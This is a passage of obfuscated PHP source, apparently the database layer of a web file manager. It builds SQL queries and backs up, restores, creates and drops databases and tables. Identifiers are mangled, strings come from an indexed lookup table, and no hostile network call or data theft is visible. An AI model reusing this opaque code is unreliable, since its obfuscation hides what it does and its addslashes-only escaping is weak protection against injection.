$_SERVER[¢ñàß¿€]; if (is_array($ğÎ¦ñÛØ)) { $£“ÂâòÉ = array(); foreach ($ğÎ¦ñÛØ as $è¹ëØ• => $‚È•Îšß) { if (is_numeric($è¹ëØ•)) { $£“ÂâòÉ[] = $this->parseKey($‚È•Îšß); } else { $‚È•Îšß = in_array(strtoupper(trim($‚È•Îšß)), array($éáŸ–Â¡[1103], $éáŸ–Â¡[1104])) ? $éáŸ–Â¡[53] . $‚È•Îšß : $éáŸ–Â¡[12]; if (preg_match($éáŸ–Â¡[1105], $è¹ëØ•)) { $£“ÂâòÉ[] = $this->parseKey($è¹ëØ•) . $‚È•Îšß; } else { think_exception($éáŸ–Â¡[1106] . $è¹ëØ•); } } } $ğÎ¦ñÛØ = implode($éáŸ–Â¡[50], $£“ÂâòÉ); } return !empty($ğÎ¦ñÛØ) ? $éáŸ–Â¡[1107] . $ğÎ¦ñÛØ : $éáŸ–Â¡[12]; } protected function parseGroup($Øò•ÜÒ×) { $»ƒ¨É¸Î =& $_SERVER[¢ñàß¿€]; return !empty($Øò•ÜÒ×) ? $»ƒ¨É¸Î[1108] . $Øò•ÜÒ× : $»ƒ¨É¸Î[12]; } protected function parseHaving($æ×èÇ®¤) { $¾›ÈªÛŠ =& $_SERVER[¢ñàß¿€]; return !empty($æ×èÇ®¤) ? $¾›ÈªÛŠ[1109] . $æ×èÇ®¤ : $¾›ÈªÛŠ[12]; } protected function parseComment($¾¾©ççè) { $æÅ¨¾²À =& $_SERVER[¢ñàß¿€]; return !empty($¾¾©ççè) ? $æÅ¨¾²À[1110] . $¾¾©ççè . $æÅ¨¾²À[1111] : $æÅ¨¾²À[12]; } protected function parseDistinct($”Ş¦Ëú) { $¢“ìÃšÙ =& $_SERVER[¢ñàß¿€]; return !empty($”Ş¦Ëú) ? $¢“ìÃšÙ[1112] : $¢“ìÃšÙ[12]; } protected function parseUnion($ÇªìÉîù) { $ˆÔÁµš¤ =& $_SERVER[¢ñàß¿€]; if (empty($ÇªìÉîù)) { return $ˆÔÁµš¤[12]; } if (isset($ÇªìÉîù[$ˆÔÁµš¤[424]])) { $ïÙ¶•ƒ = $ˆÔÁµš¤[1113]; unset($ÇªìÉîù[$ˆÔÁµš¤[424]]); } else { $ïÙ¶•ƒ = $ˆÔÁµš¤[1114]; } foreach ($ÇªìÉîù as $“•±µÊÆ) { $—ÑšÛÌŸ[] = $ïÙ¶•ƒ . (is_array($“•±µÊÆ) ? $this->buildSelectSql($“•±µÊÆ) : $“•±µÊÆ); } return implode($ˆÔÁµš¤[53], $—ÑšÛÌŸ); } public function insert($şë¤íı , $§šç²Íù = array(), $š¬½ªªù = false) { $Ó“¼¡Ø =& $_SERVER[¢ñàß¿€]; $ŞÙ™Ï¡ê = $šĞËŒ½Ä = array(); $this->model = $§šç²Íù[$Ó“¼¡Ø[358]]; foreach ($şë¤íı  as $Í¾Ş¿©ª => $¯ŞÃ„êÇ) { if (is_array($¯ŞÃ„êÇ) && $Ó“¼¡Ø[373] == $¯ŞÃ„êÇ[0]) { $šĞËŒ½Ä[] = $this->parseKey($Í¾Ş¿©ª); $ŞÙ™Ï¡ê[] = $¯ŞÃ„êÇ[1]; } elseif (is_scalar($¯ŞÃ„êÇ) || is_null($¯ŞÃ„êÇ)) { $šĞËŒ½Ä[] = $this->parseKey($Í¾Ş¿©ª); $ŞÙ™Ï¡ê[] = $this->parseValue($¯ŞÃ„êÇ); } } $ÔÈöñü = ($š¬½ªªù ? $Ó“¼¡Ø[982] : $Ó“¼¡Ø[983]) . $Ó“¼¡Ø[984] . $this->parseTable($§šç²Íù[$Ó“¼¡Ø[356]]) . $Ó“¼¡Ø[978] . implode($Ó“¼¡Ø[50], $šĞËŒ½Ä) . $Ó“¼¡Ø[979] . implode($Ó“¼¡Ø[50], $ŞÙ™Ï¡ê) . $Ó“¼¡Ø[980]; $ÔÈöñü .= $this->parseLock(isset($§šç²Íù[$Ó“¼¡Ø[914]]) ? $§šç²Íù[$Ó“¼¡Ø[914]] : !1); $ÔÈöñü .= $this->parseComment(!empty($§šç²Íù[$Ó“¼¡Ø[430]]) ? $§šç²Íù[$Ó“¼¡Ø[430]] : $Ó“¼¡Ø[12]); return $this->execute($ÔÈöñü, $this->parseBind(!empty($§šç²Íù[$Ó“¼¡Ø[361]]) ? $§šç²Íù[$Ó“¼¡Ø[361]] : array())); } public function selectInsert($˜ÄÎêáó, $£ºñÔ»ã, $ğ»øÔÄô = array()) { $÷Û÷Ú ¼ =& $_SERVER[¢ñàß¿€]; $this->model = $ğ»øÔÄô[$÷Û÷Ú ¼[358]]; if (is_string($˜ÄÎêáó)) { $˜ÄÎêáó = explode($÷Û÷Ú ¼[50], $˜ÄÎêáó); } array_walk($˜ÄÎêáó, array($this, $÷Û÷Ú ¼[981])); $ ÓÚæ…ó = $÷Û÷Ú ¼[1115] . $this->parseTable($£ºñÔ»ã) . $÷Û÷Ú ¼[978] . implode($÷Û÷Ú ¼[50], $˜ÄÎêáó) . $÷Û÷Ú ¼[1093]; $ ÓÚæ…ó .= $this->buildSelectSql($ğ»øÔÄô); return $this->execute($ ÓÚæ…ó, $this->parseBind(!empty($ğ»øÔÄô[$÷Û÷Ú ¼[361]]) ? $ğ»øÔÄô[$÷Û÷Ú ¼[361]] : array())); } public function update($ıœô¦²™, $Àä‹ÕÈ­) { $øğÌñÄ– =& $_SERVER[¢ñàß¿€]; $this->model = $Àä‹ÕÈ­[$øğÌñÄ–[358]]; $÷ Ù¸ŒĞ = $øğÌñÄ–[1116] . $this->parseTable($Àä‹ÕÈ­[$øğÌñÄ–[356]]) . $this->parseSet($ıœô¦²™) . $this->parseWhere(!empty($Àä‹ÕÈ­[$øğÌñÄ–[352]]) ? $Àä‹ÕÈ­[$øğÌñÄ–[352]] : $øğÌñÄ–[12]) . $this->parseOrder(!empty($Àä‹ÕÈ­[$øğÌñÄ–[441]]) ? $Àä‹ÕÈ­[$øğÌñÄ–[441]] : $øğÌñÄ–[12]) . $this->parseLimit(!empty($Àä‹ÕÈ­[$øğÌñÄ–[368]]) ? $Àä‹ÕÈ­[$øğÌñÄ–[368]] : $øğÌñÄ–[12]) . $this->parseLock(isset($Àä‹ÕÈ­[$øğÌñÄ–[914]]) ? $Àä‹ÕÈ­[$øğÌñÄ–[914]] : !1) . $this->parseComment(!empty($Àä‹ÕÈ­[$øğÌñÄ–[430]]) ? $Àä‹ÕÈ­[$øğÌñÄ–[430]] : $øğÌñÄ–[12]); return $this->execute($÷ Ù¸ŒĞ, $this->parseBind(!empty($Àä‹ÕÈ­[$øğÌñÄ–[361]]) ? $Àä‹ÕÈ­[$øğÌñÄ–[361]] : array())); } public function delete($ê™¦âÎÚ = array()) { $Ø¾ÑÏ¾à =& $_SERVER[¢ñàß¿€]; $this->model = $ê™¦âÎÚ[$Ø¾ÑÏ¾à[358]]; $¥›ñŞ¬ = $Ø¾ÑÏ¾à[1117] . $this->parseTable($ê™¦âÎÚ[$Ø¾ÑÏ¾à[356]]) . $this->parseWhere(!empty($ê™¦âÎÚ[$Ø¾ÑÏ¾à[352]]) ? $ê™¦âÎÚ[$Ø¾ÑÏ¾à[352]] : $Ø¾ÑÏ¾à[12]) . $this->parseOrder(!empty($ê™¦âÎÚ[$Ø¾ÑÏ¾à[441]]) ? $ê™¦âÎÚ[$Ø¾ÑÏ¾à[441]] : $Ø¾ÑÏ¾à[12]) . $this->parseLimit(!empty($ê™¦âÎÚ[$Ø¾ÑÏ¾à[368]]) ? $ê™¦âÎÚ[$Ø¾ÑÏ¾à[368]] : $Ø¾ÑÏ¾à[12]) . $this->parseLock(isset($ê™¦âÎÚ[$Ø¾ÑÏ¾à[914]]) ? $ê™¦âÎÚ[$Ø¾ÑÏ¾à[914]] : !1) . $this->parseComment(!empty($ê™¦âÎÚ[$Ø¾ÑÏ¾à[430]]) ? $ê™¦âÎÚ[$Ø¾ÑÏ¾à[430]] : $Ø¾ÑÏ¾à[12]); return $this->execute($¥›ñŞ¬, $this->parseBind(!empty($ê™¦âÎÚ[$Ø¾ÑÏ¾à[361]]) ? $ê™¦âÎÚ[$Ø¾ÑÏ¾à[361]] : array())); } public function select($ÙÉÍ¬Ï€ = array()) { $æŞ—ü°… =& $_SERVER[¢ñàß¿€]; $this->model = $ÙÉÍ¬Ï€[$æŞ—ü°…[358]]; $¸¨©·—— = $this->buildSelectSql($ÙÉÍ¬Ï€); $ŠÙØÈÄß = isset($ÙÉÍ¬Ï€[$æŞ—ü°…[425]]) ? $ÙÉÍ¬Ï€[$æŞ—ü°…[425]] : !1; if ($ŠÙØÈÄß) { $üÂÓ‘ƒ = is_string($ŠÙØÈÄß[$æŞ—ü°…[97]]) ? $ŠÙØÈÄß[$æŞ—ü°…[97]] : $æŞ—ü°…[1118] . md5($¸¨©·——); $‹¸ÉéñÈ = think_cache($üÂÓ‘ƒ, $æŞ—ü°…[12], $ŠÙØÈÄß); if (!1 !== $‹¸ÉéñÈ) { return $‹¸ÉéñÈ; } } $°§ŒççÇ = $this->query($¸¨©·——, $this->parseBind(!empty($ÙÉÍ¬Ï€[$æŞ—ü°…[361]]) ? $ÙÉÍ¬Ï€[$æŞ—ü°…[361]] : array())); if ($ŠÙØÈÄß && !1 !== $°§ŒççÇ) { think_cache($üÂÓ‘ƒ, $°§ŒççÇ, $ŠÙØÈÄß); } return $°§ŒççÇ; } public function buildSelectSql($°Ğõ¨Ç = array()) { $æÂı˜º =& $_SERVER[¢ñàß¿€]; if (isset($°Ğõ¨Ç[$æÂı˜º[429]])) { if (strpos($°Ğõ¨Ç[$æÂı˜º[429]], $æÂı˜º[50])) { list($©İŸ¹¡», $­·ĞúÅ) = explode($æÂı˜º[50], $°Ğõ¨Ç[$æÂı˜º[429]]); } else { $©İŸ¹¡» = $°Ğõ¨Ç[$æÂı˜º[429]]; } $©İŸ¹¡» = $©İŸ¹¡» ? $©İŸ¹¡» : 1; $­·ĞúÅ = isset($­·ĞúÅ) ? $­·ĞúÅ : (is_numeric($°Ğõ¨Ç[$æÂı˜º[368]]) ? $°Ğõ¨Ç[$æÂı˜º[368]] : 20); $›û°Í‡Á = $­·ĞúÅ * ((int) $©İŸ¹¡» - 1); $°Ğõ¨Ç[$æÂı˜º[368]] = $›û°Í‡Á . $æÂı˜º[50] . $­·ĞúÅ; } if (think_config($æÂı˜º[1119])) { $á€µ–çÚ = $æÂı˜º[1120] . md5(serialize($°Ğõ¨Ç)); $ŞÕÚ·À¹ = think_cache($á€µ–çÚ); if ($ŞÕÚ·À¹) { return $ŞÕÚ·À¹; } } $íšŠÔşÕ = $this->parseSql($this->selectSql, $°Ğõ¨Ç); $íšŠÔşÕ .= $this->parseLock(isset($°Ğõ¨Ç[$æÂı˜º[914]]) ? $°Ğõ¨Ç[$æÂı˜º[914]] : !1); if (isset($á€µ–çÚ)) { think_cache($á€µ–çÚ, $íšŠÔşÕ); } return $íšŠÔşÕ; } public function parseSql($è¸Ôº°, $¥…ìîõú = array()) { $’õ´½ï =& $_SERVER[¢ñàß¿€]; $è¸Ôº° = str_replace(array($’õ´½ï[1121], $’õ´½ï[1122], $’õ´½ï[1123], $’õ´½ï[1124], $’õ´½ï[1125], $’õ´½ï[1126], $’õ´½ï[1127], $’õ´½ï[1128], $’õ´½ï[1129], $’õ´½ï[1130], $’õ´½ï[1131]), array($this->parseTable("{$¥…ìîõú[$’õ´½ï[356]]}"), $this->parseDistinct(isset($¥…ìîõú[$’õ´½ï[1132]]) ? $¥…ìîõú[$’õ´½ï[1132]] : !1), $this->parseField(!empty($¥…ìîõú[$’õ´½ï[350]]) ? $¥…ìîõú[$’õ´½ï[350]] : $’õ´½ï[220]), $this->parseJoin(!empty($¥…ìîõú[$’õ´½ï[359]]) ? $¥…ìîõú[$’õ´½ï[359]] : $’õ´½ï[12]), $this->parseWhere(!empty($¥…ìîõú[$’õ´½ï[352]]) ? $¥…ìîõú[$’õ´½ï[352]] : $’õ´½ï[12]), $this->parseGroup(!empty($¥…ìîõú[$’õ´½ï[578]]) ? $¥…ìîõú[$’õ´½ï[578]] : $’õ´½ï[12]), $this->parseHaving(!empty($¥…ìîõú[$’õ´½ï[1133]]) ? $¥…ìîõú[$’õ´½ï[1133]] : $’õ´½ï[12]), $this->parseOrder(!empty($¥…ìîõú[$’õ´½ï[441]]) ? $¥…ìîõú[$’õ´½ï[441]] : $’õ´½ï[12]), $this->parseLimit(!empty($¥…ìîõú[$’õ´½ï[368]]) ? $¥…ìîõú[$’õ´½ï[368]] : $’õ´½ï[12]), $this->parseUnion(!empty($¥…ìîõú[$’õ´½ï[423]]) ? $¥…ìîõú[$’õ´½ï[423]] : $’õ´½ï[12]), $this->parseComment(!empty($¥…ìîõú[$’õ´½ï[430]]) ? $¥…ìîõú[$’õ´½ï[430]] : $’õ´½ï[12])), $è¸Ôº°); return $è¸Ôº°; } public function getLastSql($½Ïœ«ˆ€ = '') { return $½Ïœ«ˆ€ ? $this->modelSql[$½Ïœ«ˆ€] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Èµ¦Ë½º) { return addslashes($Èµ¦Ë½º); } public function setModel($ ‹¹‘øÖ) { $this->model = $ ‹¹‘øÖ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($Î¡ Òæö = array()) { $‘ñ¨À´ =& $_SERVER[¢ñàß¿€]; if (empty($Î¡ Òæö)) { $Î¡ Òæö = $GLOBALS[$‘ñ¨À´[6]][$‘ñ¨À´[21]]; } $this->database = $Î¡ Òæö; } public function model($ó•öñº¿ = '') { return new ModelBase($ó•öñº¿, $_SERVER[¢ñàß¿€][12], $this->database); } public function db($ÀÄ•Ô»å = false) { $ß¿µÂ•ó =& $_SERVER[¢ñàß¿€]; $íßå¥ˆ§ = array_change_key_case($this->database); if ($this->dbType() == $ß¿µÂ•ó[13] || !$ÀÄ•Ô»å) { return $this->model()->db(); } $ØîİÚúö = $íßå¥ˆ§[$ß¿µÂ•ó[1047]]; $íßå¥ˆ§[$ß¿µÂ•ó[1047]] = $ß¿µÂ•ó[12]; if ($íßå¥ˆ§[$ß¿µÂ•ó[1042]] == $ß¿µÂ•ó[1039]) { $ã´Äû¡ = $íßå¥ˆ§[$ß¿µÂ•ó[1048]]; $íßå¥ˆ§[$ß¿µÂ•ó[1048]] = substr($ã´Äû¡, 0, strrpos($ã´Äû¡, $ß¿µÂ•ó[1134])); } $this->database = $íßå¥ˆ§; $øÔ¤×ñ¯ = $this->model()->db(); try { $û–µ ‹˜ = $øÔ¤×ñ¯->execute("\x73\x68\157\x77\x20\144\141\164\141\x62\141\x73\x65\x73\x20\154\x69\x6b\x65\x20\x27{$ØîİÚúö}\47"); } catch (Exception $İÜ³¤‘Î) { } if (!$û–µ ‹˜) { $øÔ¤×ñ¯->execute("\143\x72\145\141\x74\x65\x20\144\x61\x74\141\x62\x61\163\145\x20\x60{$ØîİÚúö}\140"); } $íßå¥ˆ§[$ß¿µÂ•ó[1047]] = $ØîİÚúö; if ($íßå¥ˆ§[$ß¿µÂ•ó[1042]] == $ß¿µÂ•ó[1039]) { $íßå¥ˆ§[$ß¿µÂ•ó[1048]] .= $ß¿µÂ•ó[1134] . $ØîİÚúö; } $this->database = $íßå¥ˆ§; $øÔ¤×ñ¯->execute("\x75\163\x65\x20\140{$ØîİÚúö}\140"); return $øÔ¤×ñ¯; } public function createTable($ïÕÅÎÀ, &$—²Èæ°‚) { $³¡ÒùğĞ =& $_SERVER[¢ñàß¿€]; if (!IO::exist($ïÕÅÎÀ)) { ActionCall($³¡ÒùğĞ[1135], !0, 0); show_json(LNG($³¡ÒùğĞ[1136]), !1); } $œª¶Óû = $this->model()->db(); $î£ ½ïÃ = sqlSplit(IO::getContent($ïÕÅÎÀ)); foreach ($î£ ½ïÃ as $ÆÙïîåá) { $ˆ£Íöá† = stripos($ÆÙïîåá, $³¡ÒùğĞ[1137]) === 0; if ($ˆ£Íöá†) { $—²Èæ°‚->task[$³¡ÒùğĞ[1138]] += 1; } $œª¶Óû->execute($ÆÙïîåá); if ($ˆ£Íöá†) { preg_match($³¡ÒùğĞ[1139], $ÆÙïîåá, $˜¢¿Æà½); $—²Èæ°‚->task[$³¡ÒùğĞ[1140]] = $˜¢¿Æà½[1]; $—²Èæ°‚->update(1); } } } public function insertTable($©ã°Óàò, &$éÇĞÛÂÄ) { $º§öá‡ü =& $_SERVER[¢ñàß¿€]; $¼¼™‡Õ’ = $this->model()->db(); $äıÃº‹ = $üâßæßª ? array($üâßæßª) : $¼¼™‡Õ’->getTables(); foreach ($©ã°Óàò as $ò¶ã¼ª) { $üâßæßª = basename($ò¶ã¼ª, $º§öá‡ü[859]); if (!in_array($üâßæßª, $äıÃº‹)) { continue; } $éÇĞÛÂÄ->task[$º§öá‡ü[1140]] = $üâßæßª; if (get_filesize($ò¶ã¼ª) == 0) { continue; } $˜Ñú‚ùÙ = $this->sqlToDb($ò¶ã¼ª, $éÇĞÛÂÄ); if (!$˜Ñú‚ùÙ) { ActionCall($º§öá‡ü[1135], !0, 0); show_json(LNG($º§öá‡ü[1141]) . "\x5b{$üâßæßª}\x5d", !1); } } } public function sqlFromDb($îÆòµö, $À·º×ĞÉ, &$É±Õß«…, $À„äÊÍ = '') { if ($É±Õß«…) { $É±Õß«…->task[$_SERVER[¢ñàß¿€][1140]] = $îÆòµö; } $ÕëÈ«¸¶ = $this->model($îÆòµö); $ƒ¤Ï²Ãì = 0; $õŒ‡Æ = 0; $ÇÍ‘Ìû = 10000; $œ¦ñ¶¨ï = fopen($À·º×ĞÉ, $_SERVER[¢ñàß¿€][1142]); $ı»ß¨ö = $ÕëÈ«¸¶->getPk(); $•‚ĞšŸ÷ = $ÕëÈ«¸¶->getDbFields(); $Ş‘±ó¾Õ = $_SERVER[¢ñàß¿€][12]; if ($GLOBALS[$_SERVER[¢ñàß¿€][858]] && in_array($îÆòµö, array($_SERVER[¢ñàß¿€][1143], $_SERVER[¢ñàß¿€][1144]))) { $Ş‘±ó¾Õ = $îÆòµö; } do { $æÏïü Ô = array($ı»ß¨ö => array($_SERVER[¢ñàß¿€][1089], $õŒ‡Æ)); $áøĞ€òµ = $ÕëÈ«¸¶->where($æÏïü Ô)->field($•‚ĞšŸ÷)->order($ı»ß¨ö . $_SERVER[¢ñàß¿€][1145])->limit($ÇÍ‘Ìû)->select(); $áøĞ€òµ = !empty($áøĞ€òµ) ? $áøĞ€òµ : array(); if (!($âİÊøı‹ = count($áøĞ€òµ))) { break; } $¹Û•ÏÕñ = end($áøĞ€òµ); $õŒ‡Æ = $¹Û•ÏÕñ[$ı»ß¨ö]; $ÕÔ†ûàÒ = array(); foreach ($áøĞ€òµ as $Åï¥›Ä«) { if ($Ş‘±ó¾Õ) { if ($îÆòµö == $_SERVER[¢ñàß¿€][1143]) { if ($Åï¥›Ä«[$_SERVER[¢ñàß¿€][33]] == $_SERVER[¢ñàß¿€][1146]) { $øÆ°Ã’Ï = json_decode($Åï¥›Ä«[$_SERVER[¢ñàß¿€][450]], !0); if ($øÆ°Ã’Ï[$_SERVER[¢ñàß¿€][32]] == $GLOBALS[$_SERVER[¢ñàß¿€][858]] && $øÆ°Ã’Ï[$_SERVER[¢ñàß¿€][821]] != 1) { continue; } } } else { if ($Åï¥›Ä«[$_SERVER[¢ñàß¿€][33]] == $_SERVER[¢ñàß¿€][1147] && $Åï¥›Ä«[$_SERVER[¢ñàß¿€][97]] == $_SERVER[¢ñàß¿€][853]) { continue; } } } if ($À„äÊÍ) { $Åï¥›Ä«[$_SERVER[¢ñàß¿€][87]] = "\x7b\151\157\x3a{$À„äÊÍ}\x7d" . substr($Åï¥›Ä«[$_SERVER[¢ñàß¿€][87]], strlen("\173\151\157\72{$Åï¥›Ä«[$_SERVER[¢ñàß¿€][888]]}\175")); $Åï¥›Ä«[$_SERVER[¢ñàß¿€][888]] = $À„äÊÍ; } $ÕÔ†ûàÒ[] = $_SERVER[¢ñàß¿€][1148] . $this->sqlEncode($Åï¥›Ä«) . $_SERVER[¢ñàß¿€][1149]; } $ñÍËõ¸­ = "\x49\116\123\x45\122\124\40\111\116\124\117\x20\x60{$îÆòµö}\140\40\50\140" . implode($_SERVER[¢ñàß¿€][1150], $•‚ĞšŸ÷) . $_SERVER[¢ñàß¿€][1151]; fwrite($œ¦ñ¶¨ï, $ñÍËõ¸­ . implode($_SERVER[¢ñàß¿€][1152], $ÕÔ†ûàÒ) . $_SERVER[¢ñàß¿€][74] . PHP_EOL); $ƒ¤Ï²Ãì += $âİÊøı‹; if ($É±Õß«…) { $É±Õß«…->update($âİÊøı‹); } } while ($ÇÍ‘Ìû == $âİÊøı‹); fclose($œ¦ñ¶¨ï); return $ƒ¤Ï²Ãì; } public function sqlToDb($èÍ¬õ ³, &$Ê³«ä×Œ) { $äë¦İ =& $_SERVER[¢ñàß¿€]; $û£äÔÄï = $this->model()->db(); $±Ÿ¶åÉò = @fopen($èÍ¬õ ³, $äë¦İ[1153]); if (!$±Ÿ¶åÉò) { return !1; } $¢íß¨©ø = 0; $„µ„çá = $äë¦İ[12]; $éÉ„â = array(); $ö•ƒì‘ = $this->dbType(); $–‡Äøç£ = $ö•ƒì‘ == $äë¦İ[13] ? 500 : 2000; $º€¨¿Ê´ = basename($èÍ¬õ ³, $äë¦İ[859]); $¹ı—Şñõ = 0; $‡õÜ°¡¹ = 4194304; while (!feof($±Ÿ¶åÉò)) { $ğË¿Ş´ = trim(fgets($±Ÿ¶åÉò)); if (!$ğË¿Ş´) { continue; } $ÌşôÜ¦› = $this->sqlDecode($ğË¿Ş´, $ö•ƒì‘, $º€¨¿Ê´); if (stripos($ÌşôÜ¦›, $äë¦İ[431]) === 0) { if (!$„µ„çá) { $„µ„çá = $ÌşôÜ¦› . $äë¦İ[53]; } continue; } if ($Ê³«ä×Œ) { $Ê³«ä×Œ->task[$äë¦İ[1138]] += 1; } $¢íß¨©ø++; $éÉ„â[] = rtrim(rtrim(trim($ÌşôÜ¦›), $äë¦İ[50]), $äë¦İ[74]); $ÓÃ³Âë© = null; $œüÆé€• = strlen($ÌşôÜ¦›); $¹ı—Şñõ += $œüÆé€•; $¹õ ‡õ¨ = strlen($„µ„çá) + $¹ı—Şñõ + (count($éÉ„â) - 1); if ($¹õ ‡õ¨ >= $‡õÜ°¡¹) { $ÓÃ³Âë© = array_pop($éÉ„â); if ($¢íß¨©ø > 1) { $¢íß¨©ø--; } } if ($¢íß¨©ø >= $–‡Äøç£ || $ÓÃ³Âë©) { $ÌşôÜ¦› = $„µ„çá . implode($äë¦İ[50], $éÉ„â); if (!$û£äÔÄï->execute($ÌşôÜ¦›)) { return !1; } if ($Ê³«ä×Œ) { $Ê³«ä×Œ->update($¢íß¨©ø); } $éÉ„â = array(); $¢íß¨©ø = 0; $¹ı—Şñõ = 0; if ($ÓÃ³Âë©) { $éÉ„â = array($ÓÃ³Âë©); $¢íß¨©ø = 1; $¹ı—Şñõ = $œüÆé€•; } } } fclose($±Ÿ¶åÉò); if (!empty($éÉ„â)) { $ÌşôÜ¦› = $„µ„çá . implode($äë¦İ[50], $éÉ„â); if (!$û£äÔÄï->execute($ÌşôÜ¦›)) { return !1; } if ($Ê³«ä×Œ) { $Ê³«ä×Œ->update($¢íß¨©ø); } } return !0; } public function dropTable($ŞáÏÄ = null) { $¸ª¦ÆÄ¯ = $this->model()->db(); $•¹ŞöæÁ = $ŞáÏÄ ? array($ŞáÏÄ) : $¸ª¦ÆÄ¯->getTables(); if (!$•¹ŞöæÁ) { return; } foreach ($•¹ŞöæÁ as $ŞáÏÄ) { if ($ŞáÏÄ) { $ŞáÏÄ = strtolower($ŞáÏÄ); } else { continue; } $¸ª¦ÆÄ¯->execute("\x64\162\x6f\160\40\x74\x61\x62\x6c\x65\x20\151\x66\x20\145\170\151\163\164\163\40\x60{$ŞáÏÄ}\x60"); } } private function sqlEncode($È»ÁïÒ) { $®à›õÀÁ =& $_SERVER[¢ñàß¿€]; $ÖÁ•º¼‰ = array(); foreach ($È»ÁïÒ as $ÜòÀƒã) { if (is_array($ÜòÀƒã)) { $ÜòÀƒã = json_encode_force($ÜòÀƒã); } $ÜòÀƒã = addslashes($ÜòÀƒã); $ÜòÀƒã = str_replace(array($®à›õÀÁ[1154], $®à›õÀÁ[262], $®à›õÀÁ[418]), array($®à›õÀÁ[1155], $®à›õÀÁ[1156], $®à›õÀÁ[1157]), $ÜòÀƒã); $ÖÁ•º¼‰[] = $ÜòÀƒã; } return $®à›õÀÁ[58] . implode($®à›õÀÁ[1158], $ÖÁ•º¼‰) . $®à›õÀÁ[58]; } private function sqlDecode($Å±òäŠî, $ŞøÇòé, $¿€ï©şß = '') { $â»ä‚ˆ =& $_SERVER[¢ñàß¿€]; $Å±òäŠî = str_replace(array($â»ä‚ˆ[1155], $â»ä‚ˆ[1156], $â»ä‚ˆ[1157]), array($â»ä‚ˆ[1154], $â»ä‚ˆ[262], $â»ä‚ˆ[418]), $Å±òäŠî); if ($ŞøÇòé == $â»ä‚ˆ[13]) { $Å±òäŠî = str_ireplace($â»ä‚ˆ[1159], $â»ä‚ˆ[59], $Å±òäŠî); $Å±òäŠî = stripslashes($Å±òäŠî); } return preg_replace($â»ä‚ˆ[1160], $â»ä‚ˆ[12], $Å±òäŠî); if ($ŞøÇòé == $â»ä‚ˆ[13]) { return $¿€ï©şß != $â»ä‚ˆ[1161] ? stripslashes($Å±òäŠî) : $Å±òäŠî; } if ($¿€ï©şß == $â»ä‚ˆ[1161]) { $Å±òäŠî = str_replace($â»ä‚ˆ[1162], $â»ä‚ˆ[121], stripslashes($Å±òäŠî)); } return $Å±òäŠî; } public function getSqlFile($±‹éÚ»Á = '') { $õÆÔ¦Ú³ =& $_SERVER[¢ñàß¿€]; $¥ƒôéÎÊ = $this->dbType(!0); $ã˜Î’½ = CONTROLLER_DIR . "\151\x6e\163\x74\x61\154\x6c\57\x64\x61\164\141\x2f{$¥ƒôéÎÊ}\56\x73\161\x6c"; $€×Ë°ßû = file_get_contents($ã˜Î’½); $ÊŒĞ—ä = $õÆÔ¦Ú³[1163] . ($¥ƒôéÎÊ == $õÆÔ¦Ú³[875] ? $õÆÔ¦Ú³[1164] : $õÆÔ¦Ú³[1165]) . $õÆÔ¦Ú³[1166]; preg_match_all($ÊŒĞ—ä, $€×Ë°ßû, $úÑ‹ğ®Ë); $¸ï©ê‹ü = $úÑ‹ğ®Ë[1]; $ÑêµÅİ‡ = $this->model()->db(); $ò»úíÚ† = $ÑêµÅİ‡->getTables(); $Æº¿´§² = TEMP_FILES . $õÆÔ¦Ú³[1167] . date($õÆÔ¦Ú³[272]) . $õÆÔ¦Ú³[8]; del_dir($Æº¿´§²); mk_dir($Æº¿´§²); $åúèªÉö = $Æº¿´§² . $õÆÔ¦Ú³[1168]; $îÀŒå±¡ = $Æº¿´§² . $õÆÔ¦Ú³[1169]; $†ò¹Ãåé = $¥ƒôéÎÊ == $õÆÔ¦Ú³[13] ? $õÆÔ¦Ú³[875] : $õÆÔ¦Ú³[13]; IO::copy(CONTROLLER_DIR . "\151\156\x73\164\x61\154\154\x2f\x64\x61\x74\x61\57{$†ò¹Ãåé}\x2e\x73\x71\x6c", $Æº¿´§²); @touch($Æº¿´§² . $¥ƒôéÎÊ . $õÆÔ¦Ú³[859]); $™„ğ›õ– = fopen($åúèªÉö, $õÆÔ¦Ú³[1142]); $àƒ¼Ğı = fopen($îÀŒå±¡, $õÆÔ¦Ú³[1142]); if ($¥ƒôéÎÊ == $õÆÔ¦Ú³[13]) { $ò»úíÚ† = array_diff($ò»úíÚ†, array($õÆÔ¦Ú³[851], $õÆÔ¦Ú³[852])); $ç›ÊµÇŠ = array($õÆÔ¦Ú³[1170], $õÆÔ¦Ú³[1171], $õÆÔ¦Ú³[1172]); fwrite($àƒ¼Ğı, implode(PHP_EOL, $ç›ÊµÇŠ) . PHP_EOL . PHP_EOL); foreach ($ò»úíÚ† as $Ú˜ô‚¯ì) { $®–¥Ê¿ñ = $this->sqlFromSqlite($Ú˜ô‚¯ì); if (!$®–¥Ê¿ñ[$õÆÔ¦Ú³[13]]) { continue; } fwrite($àƒ¼Ğı, $®–¥Ê¿ñ[$õÆÔ¦Ú³[13]] . PHP_EOL . PHP_EOL); if (!in_array($Ú˜ô‚¯ì, $¸ï©ê‹ü)) { fwrite($™„ğ›õ–, $®–¥Ê¿ñ[$õÆÔ¦Ú³[875]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ò»úíÚ† as $Ú˜ô‚¯ì) { $®–¥Ê¿ñ = $this->sqlFromMysql($Ú˜ô‚¯ì); if (!$®–¥Ê¿ñ[$õÆÔ¦Ú³[875]]) { continue; } fwrite($™„ğ›õ–, $®–¥Ê¿ñ[$õÆÔ¦Ú³[875]] . PHP_EOL . PHP_EOL); if (!in_array($Ú˜ô‚¯ì, $¸ï©ê‹ü)) { fwrite($àƒ¼Ğı, $®–¥Ê¿ñ[$õÆÔ¦Ú³[13]] . PHP_EOL . PHP_EOL); } } } fclose($™„ğ›õ–); fclose($àƒ¼Ğı); $€×Ë°ßû = array($õÆÔ¦Ú³[875] => $åúèªÉö, $õÆÔ¦Ú³[13] => $îÀŒå±¡); return $±‹éÚ»Á ? $€×Ë°ßû[$±‹éÚ»Á] : $€×Ë°ßû; } public function dbType($î´¨§äÑ = false) { $éŒ±úî… =& $_SERVER[¢ñàß¿€]; $ÀÍ‘½œü = $î´¨§äÑ ? $GLOBALS[$éŒ±úî…[6]][$éŒ±úî…[21]] : $this->database; $ÀÍ‘½œü = array_change_key_case($ÀÍ‘½œü); $¹ƒ€à· = 